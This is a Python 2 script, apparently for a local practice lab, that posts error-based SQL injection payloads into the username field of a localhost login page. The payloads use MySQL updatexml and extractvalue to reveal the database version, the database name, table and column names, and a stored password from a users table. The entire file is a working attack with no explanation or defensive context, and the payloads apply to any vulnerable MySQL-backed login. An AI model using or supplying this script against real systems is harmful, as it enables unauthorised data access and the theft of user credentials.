#!
import urllib
import urllib2
import httplib

################################################################################
def Post(string):
    httpClient = None
    try:
        print "TESTING: "+string
        params = urllib.urlencode({'username':string,'password':''})
        headers = {"Content-type": "application/x-www-form-urlencoded"
                        , "Accept": "text/plain"}

        httpClient = httplib.HTTPConnection("localhost", 80, timeout=30)
        httpClient.request("POST", "/login1.php", params, headers)

        response = httpClient.getresponse()
        #print response.status
        #print response.reason
        st = response.read()
        print st
        if (st == "TRUE"):
            return 1
        else:
            return 0
        print response.getheaders()
    except Exception, e:
        print e
    finally:
        if httpClient:
            httpClient.close()



version = "'or updatexml(1,concat(0x7e,(version())),0)# "
database = "'or updatexml(1,concat(0x7e,(database())),0)# "
table = "' or extractvalue(1,concat(0x7e,(select table_name from INFORMATION_SCHEMA.columns where table_schema=\"injection\" limit 1 offset 0)))#"
count = "' or extractvalue(1,concat(0x7e,(select column_name from INFORMATION_SCHEMA.columns where table_schema=\"injection\" and table_name=\"users\" limit 1 offset 0)))#"

content = "' or extractvalue(1,concat(0x7e,(select password from injection.users limit 1 offset 1)))#"

Post(version)
Post(database)
Post(table)
Post(count)
Post(content)